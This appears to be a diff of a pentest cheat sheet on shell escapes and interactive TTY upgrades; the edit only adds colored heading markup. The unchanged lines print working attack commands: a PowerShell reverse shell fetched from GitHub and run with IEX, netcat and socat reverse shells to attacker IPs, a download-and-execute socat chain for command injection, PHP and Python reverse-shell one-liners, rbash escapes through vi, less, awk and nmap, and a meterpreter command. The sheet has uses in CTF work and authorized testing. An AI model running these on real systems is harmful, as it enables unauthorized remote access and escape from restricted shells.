@@ -1,16 +1,16 @@
 # ⭕ Shell Escape / Interactive TTY
 
-## windows interactive reverse powershell
+## <mark style="color:red;">windows interactive reverse powershell</mark>
 
 {% embed url="https://github.com/antonioCoco/ConPtyShell" %}
 
-#### Server (attacker) Side:
+#### <mark style="color:green;">Server (attacker) Side:</mark>
 
 ```
 stty raw -echo; (stty size; cat) | nc -lvnp 3001
 ```
 
-#### Client Side (directly load from git repository):
+#### <mark style="color:green;">Client Side (directly load from git repository):</mark>
 
 ```
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.56.1 3001
@@ -29,9 +29,9 @@ wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-Con
 IEX(IWR http://192.168.56.1/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.56.1 9999
 ```
 
-## Linux Interactive Shell
+## <mark style="color:red;">Linux Interactive Shell</mark>
 
-### check $SHELL and $PATH
+### <mark style="color:orange;">check $SHELL and $PATH</mark>
 
 fix the path problem if you cant access default shells
 
@@ -39,17 +39,17 @@ fix the path problem if you cant access default shells
 export PATH=/bin:/usr/bin:$PATH
 ```
 
-### Using Python & STTY
+### <mark style="color:orange;">Using Python & STTY</mark>
 
-#### In your current non-interactive reverse shell type:
+#### <mark style="color:green;">In your current non-interactive reverse shell type:</mark>
 
 ```
  python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-#### press Ctrl+z to send the shell to background
+#### <mark style="color:green;">press Ctrl+z to send the shell to background</mark>
 
-#### then in the same terminal type in:
+#### <mark style="color:green;">then in the same terminal type in:</mark>
 
 ```
 echo $TERM >>> take note of terminal name
@@ -58,7 +58,7 @@ stty raw -echo
 fg
 ```
 
-#### then you will have an empty terminal, type these:
+#### <mark style="color:green;">then you will have an empty terminal, type these:</mark>
 
 ```
  reset
@@ -67,9 +67,9 @@ fg
 stty rows <num> columns <cols>
 ```
 
-### Using /usr/bin/script
+### <mark style="color:orange;">Using /usr/bin/script</mark>
 
-#### in your current non-interactive reverse shell type in:
+#### <mark style="color:green;">in your current non-interactive reverse shell type in:</mark>
 
 ```
  /usr/bin/script -qc /bin/bash /dev/null
@@ -77,15 +77,15 @@ stty rows <num> columns <cols>
 
 the rest is like the above method, we just use /usr/bin/script if python is not installed
 
-### Using Socat & STTY
+### <mark style="color:orange;">Using Socat & STTY</mark>
 
-attacker:
+<mark style="color:green;">**attacker:**</mark>
 
 ```
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
 
-victim:
+<mark style="color:green;">**victim:**</mark>
 
 ```
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
@@ -101,15 +101,15 @@ With a command injection vuln, it’s possible to download the correct architect
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
-## Semi-interactive Spawn & Escape
+## <mark style="color:red;">Semi-interactive Spawn & Escape</mark>
 
-### ​​rbash escape through SSH
+### <mark style="color:orange;">​​rbash escape through SSH</mark>
 
 ```
 ssh hackNos@<IP-Adress> -t "bash --noprofile"
 ```
 
-### rbash escape through editors
+### <mark style="color:orange;">rbash escape through editors</mark>
 
 ```
 vi
@@ -117,7 +117,7 @@ vi
 :shell
 ```
 
-### escaping rbash – editor
+### <mark style="color:orange;">escaping rbash – editor</mark>
 
 ```
 ed
@@ -125,7 +125,7 @@ ed
 pwd
 ```
 
-### escape rbash through reverse shell
+### <mark style="color:orange;">escape rbash through reverse shell</mark>
 
 ```
 nc -lvp 4545
@@ -136,13 +136,13 @@ php -r '$sock=fsockopen("ip-address",port);exec("/bin/bash -i <&3 >&3 2>&3");'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip-address",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
-### rbash escape Awk
+### <mark style="color:orange;">rbash escape Awk</mark>
 
 ```
 awk 'BEGIN {system("/bin/bash")}'
 ```
 
-### interpreters
+### <mark style="color:orange;">interpreters</mark>
 
 ```
 python -c 'import pty; pty.spawn("/bin/sh");'  
@@ -152,14 +152,14 @@ ruby -e ‘exec "/bin/sh"’
 lua -e 'os.execute('/bin/sh')'
 ```
 
-### rbash bypass through binary file
+### <mark style="color:orange;">rbash bypass through binary file</mark>
 
 ```
 less anyfile.txt
 !'bash'
 ```
 
-### sh
+### <mark style="color:orange;">sh</mark>
 
 ```
 /usr/bin/script -qc /bin/bash /dev/null
@@ -168,20 +168,20 @@ echo os.system('/bin/bash')
 exec "/bin/sh"
 ```
 
-### ​​within nmap
+### ​​<mark style="color:orange;">within nmap</mark>
 
 ```
 !sh
 ```
 
-### rlwrap for Making the Shell Semi-interactive
+### <mark style="color:orange;">rlwrap for Making the Shell Semi-interactive</mark>
 
 ```
 # use with netcat or other shells
 rlwrap nc -nvlp 1234
 ```
 
-### in meterpreter
+### <mark style="color:orange;">in meterpreter</mark>
 
 ```
 execute -f cmd.exe -H -c -i
